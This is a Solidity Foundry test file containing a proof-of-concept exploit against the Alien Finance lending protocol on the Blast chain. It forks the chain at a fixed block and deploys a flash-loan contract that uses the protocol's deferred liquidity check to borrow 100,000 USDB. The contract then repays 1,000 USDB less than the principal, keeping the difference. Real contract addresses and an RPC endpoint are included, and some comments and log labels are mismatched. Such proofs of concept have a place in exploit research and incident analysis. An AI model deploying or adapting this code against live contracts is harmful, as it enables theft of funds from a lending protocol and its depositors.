// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import "forge-std/Test.sol";
// import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IERC3156FlashBorrower.sol";


interface IAlienFinance {
    function isMarketListed(address market) external view returns (bool);
    function deferLiquidityCheck(address user, bytes memory data) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function getMarketConfiguration(address market) external view returns (DataTypes.MarketConfig memory);
    function repay(address from, address to, address asset, uint256 amount) external;

}
interface IDeferLiquidityCheck {
    /**
     * @dev The callback function that deferLiquidityCheck will invoke.
     * @param data The arbitrary data that was passed in by the caller
     */
    function onDeferredLiquidityCheck(bytes memory data) external;
}
library PauseFlags {
    uint8 internal constant PAUSE_BORROW_MASK = 0xFD;
    function isBorrowPaused(DataTypes.MarketConfig memory self) internal pure returns (bool) {
        return toBool(self.pauseFlags & ~PAUSE_BORROW_MASK);
    }

    function toBool(uint8 x) internal pure returns (bool) {
        return x != 0;
    }
}
library DataTypes {
    struct MarketConfig {
        bool isListed;
        uint8 pauseFlags;
    }
    struct Market {
        MarketConfig config;
    }
}
interface IERC3156FlashLender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
    
    function flashFee(address token, uint256 amount) external view returns (uint256);
}


contract flashanddefarTest is Test, IERC3156FlashBorrower {
    using SafeMath for uint;
    address private constant blast = 0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad;
    address private constant weth = 0x4300000000000000000000000000000000000004;
    address private constant usbd = 0x4300000000000000000000000000000000000003;
    IAlienFinance private allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    address private attacker;
    FlashLoan flashloan;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 6343272);
        attacker = msg.sender;
        vm.deal(address(this), 10.1 ether);
        vm.prank(address(this));
        flashloan = new FlashLoan();
    }

    function testExploit() public {
        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(usbd).balanceOf(address(this)), 18);

        address token = address(usbd);
        uint256 amount = 100000 * 10**18;  // 250 USDB with 18 decimals

        flashloan.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, "");

        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(usbd).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(usbd).balanceOf(address(flashloan)), 18);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee3,
        bytes calldata data
    ) external override returns (bytes32) {
        require(msg.sender == address(flashloan), "Untrusted lender");
        require(address(_token) == address(usbd), "Token mismatch");
        require(initiator == address(this), "you are not me");
        emit log_named_decimal_uint("[After] Attacker blast during exploit", IERC20(usbd).balanceOf(address(this)), 18);

        require(IERC20(usbd).approve(address(flashloan), IERC20(usbd).balanceOf(address(this))));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

}


contract FlashLoan is IERC3156FlashLender, IDeferLiquidityCheck {

    using SafeERC20 for IERC20;
    using PauseFlags for DataTypes.MarketConfig;
    uint16 public feeRate;

    /// @notice The standard signature for ERC-3156 borrower
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bool internal _isDeferredLiquidityCheck;
    IAlienFinance private allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);

    function flashFee(address token, uint256 amount) external view override returns (uint256) {
        amount;

        require(IAlienFinance(allien).isMarketListed(token), "token not listed");

        DataTypes.MarketConfig memory config = IAlienFinance(allien).getMarketConfiguration(token);
        require(!config.isBorrowPaused(), "borrow is paused");

        return _flashFee(amount);
    }


    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        override
        returns (bool)
    {
        require(IAlienFinance(allien).isMarketListed(token), "token not listed");

        if (!_isDeferredLiquidityCheck) {
            IAlienFinance(allien).deferLiquidityCheck(
                address(this), abi.encode(receiver, token, amount, data, msg.sender)
            );
            _isDeferredLiquidityCheck = false;
        } else {
            _loan(receiver, token, amount, data, msg.sender);
        }

        return true;
    }

    /// @inheritdoc IDeferLiquidityCheck
    function onDeferredLiquidityCheck(bytes memory encodedData) external override {
        require(msg.sender == address(allien), "untrusted message sender");
        (IERC3156FlashBorrower receiver, address token, uint256 amount, bytes memory data, address msgSender) =
            abi.decode(encodedData, (IERC3156FlashBorrower, address, uint256, bytes, address));

        _isDeferredLiquidityCheck = true;
        _loan(receiver, token, amount, data, msgSender);
    }

    function _flashFee(uint256 amount) internal view returns (uint256) {
        return amount * feeRate / 10000;
    }

    function _loan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes memory data, address msgSender)
        internal
    {
        uint256 fee = _flashFee(amount);

        IAlienFinance(allien).borrow(address(this), address(receiver), token, amount);

        require(receiver.onFlashLoan(msgSender, token, amount, fee, data) == CALLBACK_SUCCESS, "callback failed");
        IERC20(token).safeTransferFrom(address(receiver), address(this), amount + fee);

        uint256 allowance = IERC20(token).allowance(address(this), address(allien));
        if (allowance < amount) {
            IERC20(token).safeApprove(address(allien), type(uint256).max);
        }

        // Only repay the principal amount to Alien.
        IAlienFinance(allien).repay(address(this), address(this), token, amount -1000 * 10**18);

    }

}